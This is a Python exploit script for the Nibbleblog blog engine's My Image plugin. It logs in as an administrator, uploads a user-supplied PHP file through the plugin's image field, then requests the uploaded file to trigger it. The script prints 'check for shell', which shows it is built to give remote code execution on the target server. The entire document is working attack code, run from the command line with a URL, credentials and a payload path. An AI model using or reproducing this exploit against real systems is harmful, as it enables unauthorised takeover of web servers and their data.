import argparse
from pathlib import Path

import requests


def login(session, nibbleURL, username, password):
	loginURL = f"{nibbleURL}admin.php"
	session.get(loginURL)
	loginPostResp = session.post(loginURL, data={'username': username, 'password': password})
	if 'Incorrect username or password.' in loginPostResp.text:
		print('[!] Login Failed.')
		return False
	else:
		print('[+] Login Successful.')
		return True

def upload_shell(session, nibbleURL, payload):
	uploadURL = f"{nibbleURL}admin.php?controller=plugins&action=config&plugin=my_image"
	uploadPostResp = session.post(uploadURL, data={'plugin':'my_image','title':'My image','position':'4','caption':'capton','image_resize':'1','image_width':'230','image_height':'200','image_option':'auto'}, files={'image': ('nibbles.php', payload, 'application/x-php')}, timeout=30)
	if '<b>Warning</b>' in uploadPostResp.text:
		print('[+] Upload likely successfull.')
	else:
		print('[-] Upload likely failed.')

def execute_shell(session, nibbleURL):
	exploitURL = f"{nibbleURL}content/private/plugins/my_image/image.php"
	exploitResp = session.get(exploitURL)

	if exploitResp.status_code == 200:
		print('[+] Exploit launched, check for shell.')
	else:
		print('[!] Exploit failed.')

def main():
	parser = argparse.ArgumentParser()
	parser.add_argument('--url', '-l', required=True)
	parser.add_argument('--username', '-u', required=True)
	parser.add_argument('--password', '-p', required=True)
	parser.add_argument('--payload', '-x', required=True)
	args = parser.parse_args()
	payload_path = Path(args.payload)
	
	if not payload_path.exists():
		print(f"payload {payload_path} doesnt exist => exiting")
		return
	
	url = args.url
	with payload_path.open('r') as f:
		payload = f.read()
	
	session = requests.Session()

	login(session, url, args.username, args.password)
	upload_shell(session, url, payload)
	execute_shell(session, url)

if __name__ == "__main__":
	main()
